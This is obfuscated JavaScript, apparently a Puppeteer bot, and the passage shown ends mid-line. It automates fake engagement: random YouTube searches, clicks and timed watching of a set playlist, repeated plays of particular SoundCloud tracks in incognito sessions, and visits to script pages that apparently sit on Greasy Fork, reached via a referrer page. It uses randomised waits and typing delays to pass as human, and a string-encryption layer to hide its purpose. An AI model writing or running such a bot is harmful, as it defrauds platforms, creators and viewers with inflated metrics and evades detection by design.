const Y = d,
  X = c,
  W = b;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (0x1 * 0x1b78 + -0x4 * -0x38b + -0x29a3))) + i;
}
async function createPage(f, h) {
  const R = b;
  let i = await f['newPage']();
  return await i['setDefault' + R(0x19, '#dmC') + 'Timeout'](-0x1320 + 0x15 * 0x14b + -0x807), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(-0x21d4 * -0x2 + -0x18d * -0x94 + 0x2cff * -0x4 + (-0x1 * -0x4363 + -0xe2 * -0xb + 0x3 * -0x62b) * random()) : await standardWaitForNetIdle(f), await wait(-0xd65 + 0x1cd9 + 0x414 + (0x11d * 0x1 + 0x43b1 + -0x1dbe) * random()), -0x9c7 + -0x7 * -0x3bf + -0x1071;
}
async function standardWaitForNetIdle(f) {
  return await wait(-0x89d + 0x1542 + 0x6e3), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), -0x5 * 0x7b + 0x2 * 0x473 + -0x67e;
}
async function randomWait() {
  return await wait(0x17aa + 0xca9 + -0x599 * 0x3 + (-0x83 * 0x48 + 0x20d + 0x1 * 0x3653) * random()), 0x1dbb + -0x10be + -0xcfc;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](-0x25b9 + -0xa80 + 0x1013 * 0x3, 0x1e65 + -0xd8d * -0x2 + -0x3978), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((0x48b * -0x3d + -0x8e25 * -0x3 + 0x5510) * getRandomInt(-0x49 + 0x1 * -0x39f + 0x3ea, 0x63b * -0x1 + -0x2 * -0x31c + 0x8), h)), -0x2561 + -0x1 * 0x1e5c + 0x43be;
}

function a() {
  const bp = [
    'iCoAgCoIeSkIohNcNSk0',
    'W4FdJHFcNfldMwGmWPFdGa',
    'WRldLSkfW61ah8oNWQrzWOO',
    'Ahr0Chm6lY9NCG',
    'mSozqmo0a8kKohRcG8kP',
    'WPxcVmkpqSk6WRGlvCoMcG',
    'FCoTWPCCu8k2W6RdSvJcSW',
    'yw5NztT2pwiZoW',
    'zwfZEwzVCMSUBW',
    'mcaOtgLUDxG7ia',
    'BwfW',
    'WOpcPN0fW6xdS3JdPgqI',
    'tCoGoCodWQ1MlaBdLHi',
    'u2fMyxjPlZuZnW',
    'zxH0CMeTCgX1zW',
    'jLmhyX1fW7RdMW',
    'com?page=9',
    'fczFabfmvmknW4eH',
    'n8odFwa4C2m3WRSO',
    'BgvUz3rO',
    'ksbbChbSzvDLyG',
    'yJvxzLv2y1nNCG',
    'ng-soon',
    'https://gr',
    'easyfork.o',
    'ECokySkCWP9pBt3cJcq',
    'y2XVC2u',
    'ya9kdubmWQZcNSkIra',
    'bCouW63cRmkIW4ldUmo8WPz+'
  ];
  a = function() {
    return bp;
  };
  return a();
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = 0x80a + 0x266 * -0x1 + -0x5a4;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[0x20ef * -0x1 + -0x14b8 + 0x194 * 0x22]['split']('\x20');
    for (let k = 0x1 * 0xf86 + -0x7 * -0x35f + -0x271f; k < i['length']; k += -0xb4f * 0x2 + 0x2156 + 0x2 * -0x55b)
      j += i[k] * h[i[k + (-0x1d * -0x45 + -0x308 * 0x2 + -0x1c0)]];
    return j;
  });
}

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (0xcda + -0x14d9 + -0x7ff * -0x1);
    let h = e[f];
    return h;
  }, d(b, c);
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](-0x1e2a + -0x235f + 0x418f)['map'](l => Array['from'](l['children']))['flat'](0x217d * -0x1 + 0xb44 + 0x5 * 0x472)['map'](l => l['childNodes'][0x25bb + 0x1539 + -0x1 * 0x3af3]['childNodes'][0x132b + -0x1a26 + 0x6fb * 0x1]['childNodes'][-0x22d5 * 0x1 + 0x170 + 0x2166]['childNodes'][0x1 * -0x19e7 + -0x5db + 0x1fc2]['childNodes'][0xda2 + 0x1 * -0x128f + 0x4ee]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(-0x6a1 * -0x2 + -0x3 * -0x5cf + 0x1ac7 * -0x1, 0x1ea6 + 0x5f7 * -0x1 + -0x1 * 0x527)), await f['click']('#__hookedV' + 'idToWatch'), await wait(0x8c7 * -0x7 + 0x27f * 0x15 + -0x6 * -0xb45);
  const h = await getMaxTime(f),
    i = Math['min']((0x11f90 + 0x14c84 + -0x181b4 * 0x1) * getRandomInt(0x1c4d + -0x1d5 * -0xc + 0xd3 * -0x3d, -0x52 * -0x49 + -0x1 * -0x4cf + -0x6 * 0x4b2), h);
  return await wait(i), -0x461 * -0x5 + -0x2094 + 0xab0;
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (0xcda + -0x14d9 + -0x7ff * -0x1);
    let h = e[f];
    if (b['mApVVA'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = -0xb77 + -0x1b * 0x9d + -0x1a6 * -0x11, s, t, u = 0x2123 + -0x755 * 0x3 + 0x1f * -0x5c; t = n['charAt'](u++); ~t && (s = r % (-0x39 * -0x63 + 0x1df + -0x17e6) ? s * (0x15 * 0x14b + -0x18d4 + 0x213 * -0x1) + t : t, r++ % (-0x75 * -0x4a + 0xc22 * -0x3 + 0x1 * 0x298)) ? p += String['fromCharCode'](-0x169 * -0x10 + 0x3 * -0x92 + -0x13db & s >> (-(0x1cd9 + -0x2c0 + 0x1a17 * -0x1) * r & 0x239c + 0x26aa + -0x4a40)) : -0x7 * -0x3bf + -0xf78 + -0xac1) {
          t = o['indexOf'](t);
        }
        for (let v = 0x1542 + -0x1a43 + 0x501, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](0x8e6 + 0x1 * 0x135b + -0x1c31))['slice'](-(0x17aa + 0xca9 + -0xc1b * 0x3));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = -0x83 * 0x48 + 0x20d + 0x3 * 0xb99,
          r, t = '';
        n = i(n);
        let u;
        for (u = 0x1dbb + -0x10be + -0xcfd; u < -0x25b9 + -0xa80 + 0x3139 * 0x1; u++) {
          p[u] = u;
        }
        for (u = 0x1e65 + -0xd8d * -0x2 + -0x397f; u < 0x5c6 * -0x4 + -0x11c5 * -0x2 + -0xb72; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (-0x49 + 0x1 * -0x39f + 0x4e8), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = 0x63b * -0x1 + -0x2 * -0x31c + 0x3, q = -0x2561 + -0x1 * 0x1e5c + 0x43bd;
        for (let v = 0x80a + 0x266 * -0x1 + -0x5a4; v < n['length']; v++) {
          u = (u + (0x20ef * -0x1 + -0x14b8 + 0x194 * 0x22)) % (0x1 * 0xf86 + -0x7 * -0x35f + -0x261f), q = (q + p[u]) % (-0xb4f * 0x2 + 0x2156 + 0x2 * -0x4dc), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (-0x1d * -0x45 + -0x308 * 0x2 + -0xc1)]);
        }
        return t;
      };
      b['qfFNMg'] = m, c = arguments, b['mApVVA'] = !![];
    }
    const j = e[-0x1e2a + -0x235f + 0x4189],
      k = f + j,
      l = c[k];
    return !l ? (b['vblvQd'] === undefined && (b['vblvQd'] = !![]), h = b['qfFNMg'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][0x21e6 * -0x1 + 0xb * -0x118 + 0x2dee]['children'][0x24a + 0x25a6 + -0x27f * 0x10]['children'][-0x4 * 0x7cb + 0x1 * 0x1a33 + -0x43 * -0x13]['children'][-0x1262 + 0x1a3 + -0x595 * -0x3]['children'][0x1 * 0x1f1e + 0x2098 + -0xe9 * 0x46]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), 0x2208 + -0x594 + -0x1 * 0x1c73;
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (0xcda + -0x14d9 + -0x7ff * -0x1);
    let h = e[f];
    if (c['joZsRD'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = -0xb77 + -0x1b * 0x9d + -0x1a6 * -0x11, r, s, t = 0x2123 + -0x755 * 0x3 + 0x1f * -0x5c; s = m['charAt'](t++); ~s && (r = q % (-0x39 * -0x63 + 0x1df + -0x17e6) ? r * (0x15 * 0x14b + -0x18d4 + 0x213 * -0x1) + s : s, q++ % (-0x75 * -0x4a + 0xc22 * -0x3 + 0x1 * 0x298)) ? o += String['fromCharCode'](-0x169 * -0x10 + 0x3 * -0x92 + -0x13db & r >> (-(0x1cd9 + -0x2c0 + 0x1a17 * -0x1) * q & 0x239c + 0x26aa + -0x4a40)) : -0x7 * -0x3bf + -0xf78 + -0xac1) {
          s = n['indexOf'](s);
        }
        for (let u = 0x1542 + -0x1a43 + 0x501, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](0x8e6 + 0x1 * 0x135b + -0x1c31))['slice'](-(0x17aa + 0xca9 + -0xc1b * 0x3));
        }
        return decodeURIComponent(p);
      };
      c['SlHYBf'] = i, b = arguments, c['joZsRD'] = !![];
    }
    const j = e[-0x83 * 0x48 + 0x20d + 0x3 * 0xb99],
      k = f + j,
      l = b[k];
    return !l ? (h = c['SlHYBf'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': 0x1164 + -0x12e4 + 0x1e4 + (0x24b * 0x2 + 0x55a + 0x9be * -0x1) * random()
  }), await wait(-0x165d + -0xe * -0x42 + 0x14b5 + (-0xd3f * 0x2 + 0x22fc + -0x752) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][-0x1 * 0x1f19 + 0x1724 + 0x7f7]['childNodes'][0x2 * -0x6f1 + 0x1 * 0x19b9 + -0xbd6]['childNodes'][0x3b * 0x79 + 0x93 * 0xb + -0x2233]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][0x43 * 0x3 + -0x253c * -0x1 + 0x2600 * -0x1]['childNodes'][0xa * -0xb3 + 0x9b5 * -0x2 + 0x4 * 0x69a]['childNodes'][0x522 + 0xf23 + -0x1443]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        const S = c;
        let q = p['split'](',\x20')[S(0xa)](u => u['split']('\x20'))['flat'](-0x25ea + 0x1933 * -0x1 + -0x2 * -0x1f8f),
          r = 0x35d + 0x1 * 0x1b75 + -0x1ed2;
        for (let u = 0x6b * 0x26 + -0x43d * -0x1 + -0x141f; u < q['length']; u += 0x226d + 0x9 * 0x1ac + -0x15 * 0x25b)
          r += q[u] * k[q[u + (-0xa * 0x3dd + 0x6d4 + 0x1fcf)]];
        return r;
      }(n);
  });
  await wait((0x24f9 + 0x2ae8 * 0x1 + 0x1 * -0x1549) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((0x33a6 + -0xad3b * -0x1 + 0xb * 0xdd) * getRandomInt(-0x7ff * 0x4 + -0x1 * 0x11f9 + 0x31f6, -0x1c2e + -0x1b1 * 0xb + 0x2ed3), h + (0x91 * 0xb + -0x1 * -0x12d1 + -0x584));
  return await wait(i), -0x6 * -0x1d0 + -0x44 * -0x8e + 0x1 * -0x3097;
}
async function keyWatch(f) {
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), -0x1e88 + 0x194 + 0x44 * 0x6d), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        const T = b;
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + T(0x11, '^zmM') + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, 0x468 + 0x927 + 0x3 * -0x9d + (0x18e3 * -0x1 + 0x1e3f * -0x1 + 0x3b0a) * Math['random']());
    });
  }, 0xab * 0xf + -0x14ce * 0x2 + 0x3aef);
  await wait(0x5e4e1 + 0x1 * 0x80391 + -0x95492);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((0x4 * 0x7061 + -0xadf7 + -0x292d) * getRandomInt(0x3 * 0x775 + -0x25a + 0x1401 * -0x1, 0x11e1 * -0x2 + -0x258f + 0x496a)), clearInterval(h), -0x4d * -0x13 + 0xd2d + -0x12e3;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = 0x2fe * -0xc + -0x233a + 0xe3a * 0x5;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return 0x4 * -0x59b + 0x19ee + -0x27 * 0x17;
    await randomWait();
  }
  return -0x2cd * -0xd + 0x151 * -0x19 + -0x37f;
}

function fetchRandomSC() {
  const U = b;
  return Math['random']() <= -0x20 * -0x103 + 0x269 + -0x22c9 + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < -0xca * -0x31 + -0x1 * 0x137 + -0x2573 + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + U(0x1, '5rg$') + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= -0x3 * -0xaee + -0xfae + -0x111c + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = 0x2 * -0xb39 + -0x1759 + -0x1 * -0x2dcb;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          const V = b;
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + V(0x1c, '7x65') + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(-0x1ab * 0x49 + -0xb2a7 + 0x1dc32 + getRandomInt(-0x5 * -0xc77 + 0xd14 + -0xd * 0x14b, -0x85f8 + 0xc737 + -0x33f1 * -0x1));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](-0x1c8a + -0xc2b + 0x28b6), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = -0x51f + 0x1357 * -0x2 + 0x2bcd;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](0x1e5 * 0x1 + 0x525 * -0x2 + 0x865, 0x1a3d * -0x1 + -0x26d8 + 0x11 * 0x3d7)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, 0x17f6 + -0x5 * 0x612 + 0x4bc * 0x3 + floor((-0x1 * 0x82b + 0x1fd0 + 0x13bd * -0x1) * random()))), log('p2'), log(await s['evaluate'](() => {
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(0x2aa * -0x560c1d + 0xc511c02c + 0xa02a8516),
          0xb * 0xab8d9 + 0x1708bf * -0x2 + 0x38202b,
          -0xac5e + -0x8 * 0xdcf + 0x19ad6,
          -0x27 * -0xef + -0x5da + -0x195 * 0x13
        ], y = [
          0x101 * 0x16 + -0x5cb * -0x1 + 0x1 * -0x1bc9,
          -0x12 * -0x10b + -0xef * 0x9 + -0xcb * 0xd,
          0x44 * -0x35 + 0x73 * -0x2f + -0x47 * -0x7f,
          -0x158e + -0x1629 + 0x2bb7
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(-0x2598 + -0x3 * -0xa84 + -0x1 * -0x60d)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = 0x1119 * 0x1 + 0x95 * 0x29 + -0x28f6; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(0x150e + -0xe75 + -0x3 * 0x233) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[-0x1 * -0x2547 + -0x1df7 * -0x1 + -0x433e] = A[-0x1c3 * 0x9 + 0x4 * 0x3c4 + 0xdb] = A[-0xde9 + -0x1be4 + 0x14e7 * 0x2] = A[-0x71 * 0x3d + 0x98d + 0xa * 0x1bd] = A[0x1 * -0xda3 + 0x1829 + 0xa83 * -0x1] = A[0x1 * 0xc29 + 0x116e + -0x1d93] = A[-0x19e7 + -0x2080 + -0x1d36 * -0x2] = A[0x1285 * -0x1 + 0x26 * 0xa9 + -0x43 * 0x19] = A[0x2 * 0xd0b + 0x1950 + 0x335f * -0x1] = A[-0x1d94 + -0x1780 + 0x351c] = A[0xd4 + -0xbdf + 0xb14] = A[0x16f4 + -0x1564 + -0x6 * 0x41] = A[0x2083 * 0x1 + -0x1a24 + 0x1 * -0x654] = A[0x1291 + 0x10 * -0xba + -0x6e5] = A[-0xdda + -0x9b1 + -0x1 * -0x1798] = A[0xca6 * -0x1 + -0xef * 0x23 + 0x2d61] = A[-0x18a * 0x4 + -0x83a + 0xe71] = 0x7 * -0x50a + -0x1 * -0x1eaf + 0x497, this['blocks'] = A) : this['blocks'] = [
                -0x998 + 0x48b + 0x50d,
                0x1675 * -0x1 + -0x1b49 + 0x31be,
                0x1c3 * 0xa + -0x9da + -0xe * 0x8e,
                -0x1 * -0x1edf + -0x1c * -0x51 + -0x27bb,
                -0x4f * -0x24 + 0x1d * -0x112 + 0x13ee,
                -0x151e + -0xf3b + 0x1 * 0x2459,
                -0x1ba5 + 0xa1d + 0x1188,
                -0x5 * 0x593 + -0x19bd + 0x49 * 0xbc,
                0x18f5 + 0x1317 + 0xb03 * -0x4,
                -0x1f31 + -0x949 * 0x2 + 0x31c3,
                0x4e4 + 0xf5b + -0x143f,
                0x10b9 + -0x1ec2 + 0xe09,
                -0x7 * 0x407 + 0x236b + -0x73a,
                -0x620 * 0x2 + 0x1 * 0x1393 + -0x753,
                -0x194b + -0xe17 * 0x1 + 0x2762,
                -0x1286 * -0x2 + -0x45c + -0x20b0,
                0x24c6 + 0x4 * -0x73b + -0x7da
              ], this['h0'] = -0x8ee9ab54 + 0x25 * -0xd07f79 + 0x114513ad2, this['h1'] = -0x134b4cfcb * 0x1 + 0x10433094d + 0x1204f7207 * 0x1, this['h2'] = -0x2 * 0x3551b666 + -0x1 * -0x83024dc1 + 0x805bfc09, this['h3'] = 0x2 * 0xc6f0064 + 0x1 * -0x82ff033 + -0x7bbc1f, this['h4'] = 0x13e9a7398 + 0xc45d736e + 0x1 * -0x13f250516, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = -0x8 * 0x40f + -0x827 + -0x1 * -0x289f, this['finalized'] = this['hashed'] = -0x10e2 + -0x1 * -0x1c71 + 0xb * -0x10d, this['first'] = -0x19cd * 0x1 + -0x2 * -0xf42 + -0x192 * 0x3;
            }
            ['update'](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = -0x25ea + -0x2f * -0xc9 + 0x1 * 0x103, O = J['length'] || -0x58 * 0x3d + 0x11a7 * -0x2 + 0x3846, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = -0x1024 * 0x1 + -0x2228 + 0x74 * 0x6f, P[0x11e0 + -0x144c + 0x26c] = this['block'], P[-0x581 * -0x1 + -0xb22 * -0x1 + -0x1093] = P[0x5e7 * -0x4 + 0x11 * 0x2d + 0x8 * 0x294] = P[0x68f + 0x1f17 + -0x4 * 0x969] = P[0x1243 + 0x2285 + -0x34c5] = P[-0x2059 + 0x44e + -0x1 * -0x1c0f] = P[-0x1c23 + -0x5 * 0x67e + 0x1 * 0x3c9e] = P[-0x11a5 * -0x2 + -0x2501 + 0x1bd * 0x1] = P[0x1f6b + -0x51 * 0x30 + -0x4 * 0x40d] = P[-0xd * 0x191 + 0x1 * 0x2162 + -0x299 * 0x5] = P[0x10e9 + 0x362 + -0x1442] = P[-0x99b + 0x1 * -0x1bb9 + -0x12af * -0x2] = P[0x15af + 0x109 * 0x1a + -0x308e] = P[-0x1a28 + -0x16e8 + 0x311c] = P[-0x1 * -0x1993 + 0x15dc + -0x2f62 * 0x1] = P[0x1 * -0x2327 + -0x140b * 0x1 + 0x44 * 0xd0] = P[-0x1c86 + 0x3e1 + -0x1 * -0x18b4] = -0x1d * -0x92 + -0x16c4 + 0x63a), K) {
                    for (N = this['start']; M < O && N < -0x2f * 0x97 + 0xb1 * -0x2 + 0x1d5b; ++M)
                      P[N >> -0x1005 * -0x2 + -0x4 * -0x233 + -0x28d4] |= J[M] << y[-0xb4a + 0x1ec3 + -0x1376 & N++];
                  } else {
                    for (N = this['start']; M < O && N < -0x2386 + 0x7f * -0x48 + 0x477e; ++M)
                      (L = J['charCodeAt'](M)) < -0x1885 * 0x1 + -0xda * -0x10 + 0xb65 ? P[N >> -0x2433 + -0x30f + 0x2744] |= L << y[0x134a + -0x806 * 0x2 + -0x33b & N++] : L < -0x24f6 + 0x2c * -0xdb + 0x294d * 0x2 ? (P[N >> -0x3 * -0x1de + -0x6db + -0x11 * -0x13] |= (0x60e * 0x2 + 0x1 * -0xb94 + 0x38 | L >> 0xbf9 * 0x2 + 0x25 * 0xb8 + -0x7a * 0x6a) << y[-0x1 * -0x186e + -0xcc4 + -0x9d * 0x13 & N++], P[N >> -0x170 * -0x13 + -0x382 + -0x17cc] |= (0x64 + 0x86 + -0x6a | -0x2062 + -0xdcd + 0x11b * 0x2a & L) << y[-0x2102 + -0x1940 * 0x1 + 0x7 * 0x853 & N++]) : L < -0x3d39 + -0x3fb0 + -0x1 * -0x154e9 || L >= 0x1b8c7 + -0xb199 + 0x5 * -0x7d6 ? (P[N >> -0x112 + 0xf74 + -0xe60] |= (0x1 * 0x949 + -0xb9e + 0x335 | L >> -0xb4e + -0xb * -0x24f + -0x2cf * 0x5) << y[0x1 * 0x44f + 0x44e + -0x3 * 0x2de & N++], P[N >> 0x106 * 0x15 + 0x85d * 0x1 + -0x1dd9] |= (0x9f0 + -0xc5e * 0x1 + 0x2ee | L >> 0x3c2 * -0x8 + -0x39b + 0x21b1 & -0xc5b + 0x121b + -0x581) << y[0x1651 * 0x1 + 0xef1 + -0x253f & N++], P[N >> 0x1369 + 0xc82 + -0x3 * 0xaa3] |= (0x1c9f + 0x1998 + 0x1 * -0x35b7 | 0x1 * 0xddf + -0x4cd + 0xfb * -0x9 & L) << y[-0x32 * 0x52 + 0x19ef + -0x9e8 & N++]) : (L = 0xd6e4 * 0x2 + 0x1e910 + -0x4 * 0xa5b6 + ((-0x7ae + -0xd8a * 0x1 + 0x5 * 0x50b & L) << 0x7 * 0x443 + 0x7 * -0x397 + -0x4aa | 0xeb4 + -0x1 * 0x1cd3 + 0x6 * 0x305 & J['charCodeAt'](++M)), P[N >> 0x1b6a + -0x2 